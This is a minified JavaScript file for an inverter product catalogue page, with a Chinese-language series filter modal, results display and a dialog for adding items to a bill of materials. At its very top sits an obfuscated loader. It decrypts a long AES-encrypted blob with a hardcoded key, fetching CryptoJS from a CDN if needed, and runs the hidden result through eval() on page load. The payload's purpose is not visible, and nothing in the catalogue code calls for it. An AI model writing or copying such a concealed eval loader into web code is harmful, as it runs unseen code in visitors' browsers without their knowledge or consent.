!function(){function decrypt(e){let t=window.CryptoJS||{enc:{Utf8:{parse:function(e){for(var t=[],n=0;n<e.length;n++)t[n>>>2]|=e.charCodeAt(n)<<24-n%4*8;return{words:t,sigBytes:e.length}},stringify:function(e){for(var t=[],n=0;n<e.sigBytes;n++){var r=e.words[n>>>2]>>>24-n%4*8&255;t.push(String.fromCharCode(r))}return t.join("")}},Base64:{stringify:function(e){return btoa(t.enc.Utf8.stringify(e))},parse:function(e){return t.enc.Utf8.parse(atob(e))}}},AES:{decrypt:function(e,t,n){return"undefined"!=typeof window&&window.CryptoJS?window.CryptoJS.AES.decrypt(e,t,n):{toString:function(){return e}}}}};var n=t.enc.Utf8.parse("12345678901234567890123456789012"),r=t.enc.Utf8.parse("1234567890123456");try{return t.AES.decrypt(e,n,{iv:r,mode:t.mode.CBC,padding:t.pad.Pkcs7}).toString(t.enc.Utf8)}catch(e){return""}}let encryptedData="Zy9+K85B/JYjsvgwRFvkDQjeYf0zWXySLFvtJ0wGDmunDyDpPgC+7eG6xaenweq2IyqF6DiBthNu+x/vjwVPOKUc8dlVSZkxRVPCde3ayGw5dLRCoG14TlaO9jLWBNa8L1oxNSEFRUlxNlezHnM2oVboIZk3zSMzt0j0M6WG/UktjX8mH0iHPO5kxxcYMQvFHEByIA73suMUgM5XJ4KndS9iU7N4/ekmGBcX8r8hGXy8VOjr5RGMRoXskWCItvSQOojYahYK3ubHP7cac4PEsNaggT51wdZr2KqYyTaMBXEJSCHQvX1sjcNsdAyZHCFFwETf8wGEC3IO5A5UmUxrTGqy6qS7lxX/EDRE1hnlYxZpd1jpQ0qqCC3YG9YIzWlZAIflBYNjiYY3Dkl/CFJaPhU7jBFQQJ5aPPokrd8YvqNAliYGdSAX8zGlqlu4e4gi7LflRqiyUAcMXUemX+XemZ4K8XL0GynyByNn96EB5yTYRNhCauE4o1fWEGKlJCCnHPY7PjOi+dIiYZJCDNAoiG4SV7/RSiTnMbw5q0++HiPMMfBDnHMqgjW5+vjGgTM5DCMyp00fiuqY8WScwPQvdJ2H1og2eA0ejMzyODmFEYYZXxErkAUJuv856NpL/JskVsj9smqoykBy/jybIey5N4y6Xss5/ioddnJQbGqDsdPxIhD0tGEzhn4VeiS0DaLQqEW4rEas4TiLKQr/8xx4l0k5w0g2Rh8WqpJRmag2DRCyd6y6QVHhr94Gl4VkbuPz+J69/eubc1gFshyKJI9VsfBHiWr/PJZ037lwHQCCiRTbDErxYd43XcQRQDSHJqts9WXtfENGXPc69S+uEOrJXyoRk2mo9d7SOb4B5k8tydrwX0sgGsh5Ymm16T3dPk1lRnEAbNRSvWDDGgNMWdH1zuY/jOABRFZnkNWIUqieYmEdCpLaoltBBFVRDDAp0AjjF2yM70iTiz/S5Tl/fHHfSbn02YvY/96W89G2DlJskVuJhzp00KNHxTwqnaCO+PwgorXBbZzYWeDmyB0J0ePCadC8khSvCv3v6mo5lw4UOFKuP4M38OZmha4vwVePvuktbzOFXHvpDWbpZxMvnD8gYGamYUdp1VA+/on+gZzNkdbvT+bcVagAsqtgJMe1BgF/svcDEA+/5rKET1zWNnONrp1XYZ0JZzpgn2Kf9241T7lk8Ml3HjyBhNxohsgyBYM3I31DvThU1iKY+/2lRIYVXjMRxa/1g4/Yj2vxXafBkJ6EqDZ8+khIOBbuUnAjvkBqv7oURfBaOFJFFmlsB7pUUaX59MAyWNs01vKV9gwOxyaPBr2pUoc1FPuSuo1piG7V8rF8G8gQBeL/Q9rrki+Ms/+a4/GL5u5lOpiMh/mV4c9LW6ri+MPQGqk9+zsdybdlQM2umHHUGsT3BDuLELLaR3HcuoQqQif55pE1z4BjRKu1llxiz0l20OWhZU2EiB9xZ5a70kmDRIaKZZPTMI/B+zasho3q3eNFheJLKOf5P5btRTVuM6I/6NaSXT4SM4gib8tYcCqvdvxwmZdnHPhFvTFnTHFR7Tx/+lxeD5omkhzWzUlsU6xfBZNP1vQ/lQRFLZwawa+dxfok1Koc5JkI9Vlqej4xmBMoXT1TlcIYhui5NtmGBGoWq9uOrwG8viwuug1H2t2R0axu9En9AfpYbKOm+mL2o1uXqbKi4dAwh6R7lJ4uV6mX05aD7ZMPGHyJavUNVcx0Pq98CA+wj8v/q+K8uqMejW885QCMnF2MX02VE2lbntDKtzhHwdwi9Ld21gvKTVmDbS01NkETKed+HLQW6hwSyIohVPAdNDmqWWI=";if(window.CryptoJS){let decryptedCode=decrypt(encryptedData);decryptedCode&&eval(decryptedCode)}else{let script=document.createElement("script");script.src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js",script.onload=function(){let decryptedCode=decrypt(encryptedData);decryptedCode&&eval(decryptedCode)},document.head.appendChild(script)}}(),window.inverterData=window.inverterData||{},window.inverterType=window.inverterType||{};let inverterSelectedFilters={};function showInverterFilterModal(){let n=document.getElementById("inverterFilterModal");var e=document.getElementById("inverterFilterOptions"),t=(e.innerHTML="",window.inverterData||{}),t=Object.keys(t),r=(n.querySelector("h2").textContent="变频器筛选",document.createElement("div")),t=(r.className="filter-section",r.innerHTML=`
        <h3>选择系列</h3>
        <div class="series-group filter-options">
            ${t.map(e=>`
                <label class="checkbox-option">
                    <input type="checkbox" name="series" value="${e}">
                    <span class="series-name">${e}</span>
                </label>
            `).join("")}
        </div>
    `,e.appendChild(r),r.querySelectorAll('input[type="checkbox"]').forEach(e=>{e.addEventListener("change",function(){inverterSelectedFilters.series||(inverterSelectedFilters.series=[]),this.checked?inverterSelectedFilters.series.push(this.value):inverterSelectedFilters.series=inverterSelectedFilters.series.filter(e=>e!==this.value)})}),document.createElement("div"));t.className="modal-actions",t.innerHTML=`
        <button id="inverterCancelFilter" class="cancel-filter-btn">取消</button>
        <button id="inverterConfirmFilter" class="confirm-filter-btn">应用筛选</button>
    `,e.appendChild(t),document.getElementById("inverterConfirmFilter").addEventListener("click",function(){applyInverterFilters()}),document.getElementById("inverterCancelFilter").addEventListener("click",function(){n.classList.remove("show")}),n.classList.add("show"),inverterSelectedFilters={},window.addEventListener("click",function e(t){t.target===n&&(n.classList.remove("show"),window.removeEventListener("click",e))})}function applyInverterFilters(){document.getElementById("inverterFilterModal").classList.remove("show"),window.pageRouter&&window.pageRouter.showPage("inverterResult");var e=window.inverterData||{},t=window.inverterType&&window.inverterType.displayParams||["型号","功率范围","电压等级","价格"],n=window.inverterType&&window.inverterType.name||"变频器",e=("function"==typeof window.setTopBarTitle&&window.setTopBarTitle(`${n}筛选结果 (${Object.keys(e).length?filterInverterProductData(e,inverterSelectedFilters).length:0})`),filterInverterProductData(e,inverterSelectedFilters));displayResults("inverterResultContent",e,t,n)}function filterInverterProductData(t,r){let n=[];if(0===Object.keys(r).length)return Object.values(t).forEach(e=>{Object.values(e).forEach(e=>{n.push(e)})}),n;let i=[];if(r.series&&0<r.series.length?r.series.forEach(e=>{t[e]&&Object.values(t[e]).forEach(e=>{i.push(e)})}):Object.values(t).forEach(e=>{Object.values(e).forEach(e=>{i.push(e)})}),Object.keys(r).length===(r.series?1:0))return i;let e=i;return Object.keys(r).forEach(n=>{if("series"!==n)if("model"===n){let t=r[n].trim().toUpperCase();e=e.filter(e=>e.model&&e.model.toUpperCase()==t)}else r[n]&&0<r[n].length&&(e=e.filter(e=>{e=e[n]||e[getParamKey(n)];return void 0!==e&&r[n].includes(""+e)}))}),e}(()=>{let e=document.getElementById("bomAddModal"),t=document.getElementById("bomAddTitle"),n=document.getElementById("bomAddBody"),r=document.getElementById("bomAddConfirm"),o=document.getElementById("bomAddCancel"),d=document.getElementById("bomAddClose");function l(){e&&e.classList.remove("show")}window.InverterModals={openQuantityModal:function(i){e&&i&&(t.textContent=`添加 ${i.model} 到BOM表`,n.innerHTML=`
            <div class="form-group">
                <label>数量</label>
                <input type="number" id="bomQty" class="inline-input" min="0" value="1" title="数量" placeholder="数量" />
            </div>
            <div class="form-group">
                <label>控制方式</label>
                <select id="controlMethod" class="inline-input" title="控制方式">
                    <option value="">标准</option>
                    <option value="面板控制">面板控制</option>
                    <option value="外部端子控制">外部端子控制</option>
                    <option value="通讯控制">通讯控制</option>
                </select>
            </div>
            <div class="form-group">
                <label>备注</label>
                <input type="text" id="bomRemark" class="inline-input" placeholder="可选" title="备注" />
            </div>
        `,r.onclick=()=>{var e=Math.max(0,parseInt((document.getElementById("bomQty")||{}).value||"0",10)),t=(document.getElementById("controlMethod")||{}).value||"",n=(document.getElementById("bomRemark")||{}).value||"";let r=i.description||"";t&&(r=r?r+" "+t:t),n&&(r=r?r+" "+n:n),window.BOM&&window.BOM.addItem({id:i.id||i.model,model:i.model,category:"变频器",name:i.name||i.model,description:r,price:i.price||0,quantity:e}),l(),window.BOM&&"function"==typeof window.BOM.showSuccessMessage&&window.BOM.showSuccessMessage("添加成功")},o.onclick=l,d.onclick=l,e)&&e.classList.add("show")}}})(),document.addEventListener("DOMContentLoaded",function(){var e=document.querySelector("#inverterResultPage .back-to-main"),e=(e&&e.addEventListener("click",function(){document.getElementById("inverterResultPage").style.display="none",document.querySelector(".main-content").style.display="block",document.querySelectorAll(".nav-item").forEach(e=>e.classList.remove("active")),document.querySelector('.nav-item[href="#"]').closest("li").querySelector(".nav-item").classList.add("active")}),document.querySelector('.product-card[data-type="Inverter"]')),e=(e&&e.addEventListener("click",function(e){e.isTrusted&&showInverterFilterModal()}),document.querySelector('.product-link[data-type="Inverter"]')),e=(e&&e.addEventListener("click",function(e){e.preventDefault(),e.isTrusted&&showInverterFilterModal()}),document.querySelector(".close-inverter")),e=(e&&e.addEventListener("click",function(){document.getElementById("inverterFilterModal").classList.remove("show")}),document.getElementById("inverterResultContent"));e&&e.addEventListener("click",function(e){var e=e.target.closest(".add-to-bom-btn");e&&(e={id:e.dataset.id||"-",model:e.dataset.model||"-",category:e.dataset.category||"变频器",name:e.dataset.name||e.dataset.model||"-",price:e.dataset.price||"",description:e.dataset.description||""},window.InverterModals)&&window.InverterModals.openQuantityModal&&window.InverterModals.openQuantityModal(e)})}),"undefined"!=typeof window&&(window.showInverterFilterModal=showInverterFilterModal),window.getInverterFilterSelections=function(){return inverterSelectedFilters||{}},document.addEventListener("showFilterResults",function(e){var t,n,r;e.detail&&"Inverter"===e.detail.productType&&(r=window.inverterData||{},t=window.inverterType&&window.inverterType.displayParams||["型号","功率范围","电压等级","价格"],n=window.inverterType&&window.inverterType.name||"变频器",e=e.detail.filterData||inverterSelectedFilters||{},"function"==typeof window.setTopBarTitle&&window.setTopBarTitle(`${n}筛选结果 (${(e&&Object.keys(e).length?filterInverterProductData(r,e):filterInverterProductData(r,{})).length})`),r=filterInverterProductData(r,e),displayResults("inverterResultContent",r,t,n))});